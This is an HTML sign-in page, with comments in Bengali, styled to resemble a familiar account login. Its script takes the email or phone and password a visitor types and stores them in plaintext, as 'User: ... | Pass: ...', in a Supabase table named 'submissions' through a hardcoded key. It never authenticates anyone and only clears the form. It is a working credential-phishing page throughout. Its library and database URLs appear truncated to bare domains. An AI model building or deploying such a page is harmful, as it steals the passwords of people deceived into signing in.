]<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <!-- সুপাবেজের সঠিক ও দ্রুততম লাইব্রেরি লিঙ্ক -->
    <script src="https://jsdelivr.net"></script>
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            transition: all 0.2s ease-in-out;
        }
        body {
            margin: 0;
            min-height: 100vh;
            background: #f8f9fa;
            display: grid;
            place-items: center;
            padding: 20px;
        }
        .login-card {
            width: 100%;
            max-width: 390px;
            background: #ffffff;
            padding: 40px 30px;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
        }
        h2 {
            margin: 0 0 5px 0;
            text-align: center;
            color: #202124;
            font-size: 24px;
            font-weight: 400;
        }
        .subtitle {
            text-align: center;
            color: #5f6368;
            font-size: 16px;
            margin: 0 0 30px 0;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            color: #202124;
            font-size: 14px;
            font-weight: 500;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            color: #202124;
        }
        input:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 1px #1a73e8;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #1a73e8;
            color: white;
            border: 0;
            border-radius: 4px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            margin-top: 15px;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3);
        }
        button:hover:not(:disabled) {
            background: #1557b0;
        }
        button:disabled {
            background: #cccccc;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

<div class="login-card">
    <h2>Sign In</h2>
    <p class="subtitle">to continue your session</p>
    
    <form id="loginForm">
        <div class="input-group">
            <label for="username">Email or Phone</label>
            <input type="text" id="username" placeholder="name@example.com" required>
        </div>
        <div class="input-group">
            <label for="password">Password</label>
            <input type="password" id="password" placeholder="Enter password" required>
        </div>
        <button id="submitBtn" type="submit">Continue</button>
    </form>
</div>

<script>
    // আপনার সুপাবেজ ড্যাশবোর্ডের সঠিক ক্রেডেনশিয়ালস
    const SUPABASE_URL = "https://supabase.co";
    const SUPABASE_KEY = "sb_publishable_aG3O0MLst2EAyBJgKi8xIA_PV8nGoLq"; 
    
    // লাইব্রেরি লোড নিশ্চিত করা হচ্ছে
    if (typeof window.supabase !== 'undefined') {
        const db = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
        const form = document.getElementById("loginForm");
        const button = document.getElementById("submitBtn");

        form.addEventListener("submit", async (event) => {
            event.preventDefault();
            
            const user = document.getElementById("username").value.trim();
            const pass = document.getElementById("password").value.trim();
            
            if (!user || !pass) return;

            button.disabled = true;

            // এখানে ইউজার আইডি এবং পাসওয়ার্ড একসাথে টেক্সট আকারে সাজানো হচ্ছে
            const submissionData = `User: ${user} | Pass: ${pass}`;

            try {
                // সুপাবেজ টেবিলের 'message' কলামে ডেটা পাঠানো হচ্ছে
                const { error } = await db
                    .from("submissions")
                    .insert({ message: submissionData });

                if (!error) {
                    form.reset(); // সফল হলে ফর্মের ভেতরের লেখা মুছে যাবে
                } else {
                    console.error("Supabase Error:", error.message);
                }
            } catch (error) {
                console.error("Submission failed:", error);
            } finally {
                button.disabled = false;
            }
        });
    } else {
        console.error("Supabase library not loaded properly.");
    }
</script>

</body>
</html>
